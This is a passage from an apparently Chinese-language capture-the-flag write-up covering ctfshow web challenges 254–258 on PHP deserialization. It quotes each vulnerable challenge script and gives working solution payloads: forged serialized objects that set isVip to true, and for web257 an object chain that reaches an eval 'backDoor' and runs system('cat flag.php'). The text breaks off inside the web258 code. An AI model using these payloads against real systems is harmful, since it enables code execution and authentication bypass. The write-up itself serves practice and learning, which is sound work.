class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序开始的地方</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这道题和反序列化没什么关系，主要看类的调用。因为账号密码都给了，直接用就可以了。传入两个get参数，分别是`username`和`password`，然后用new实例化`ctfShowUser`这个类，接着调用`login`这个方法，可以看到如果用户名和密码都正确的话就把true赋值给`isVip`，然后就是进入`checkVip`和`vipOneKeyGetFlag`方法获得flag。所以payload为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx  //账号密码用设置好的才可以</span><br></pre></td></tr></table></figure>### web255<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这题和上一题的区别是在类里面没有对`isVip`属性进行赋值`true`，所以我们需要想办法把`isVip`赋值成`true`才能获得flag；观察可以看到会对`cookie`中的`user`进行反序列化，所以这里是一个漏洞点，我们可以往这里传入序列化的字符串，通过反序列化把`isVip`赋值成true。本地新建一个php文件，对类`ctfShowUser`赋值，然后进行序列化<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web255.php</span></span><br><span class="line"><span class="comment">#time: 2023/10/8 14:34</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web255-1.png)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>随后使用BP发包，记得要对序列化内容进行url编码![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web255-2.png)不一定要账号密码都为xxxxxx，只要序列化的时候isVIP为true，账号密码可以任意填，比如![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web255-3.png)### web256<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这次多了一个条件`$this->username!==$this->password`这两个值判断结果不能一样，那么我们在序列化的时候设置不一样的用户和密码就可以了<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web256.php</span></span><br><span class="line"><span class="comment">#time: 2023/10/8 14:55</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;MTRleed&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web256-1.png)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:7:&quot;MTRleed&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web256-2.png)### web257<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>首先分析一下里面的3个类，`ctfShowUser`类，先会实例化一个`info`对象，然后调用`login`方法，最后销毁对象时触发对`getInfo()`方法的调用，但是调用的是`info`中的，`backDoor`类中有对`getInfo()`方法的定义，是`eval`命令对`$code`进行执行。`info`类最终会返回用户名。序列化处 `$user = unserialize($_COOKIE['user']);`思路：序列化一个对象能触发`backDoor`，构造恶意代码让`eval`执行<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;  <span class="comment">//可以public</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>; <span class="comment">//可以public</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>)); <span class="comment">//对序列化结果进行url编码。在网站在线url编码不可以将私有属性编码会导致序列化失败</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>序列化结果<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web257-1.png)### web258<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 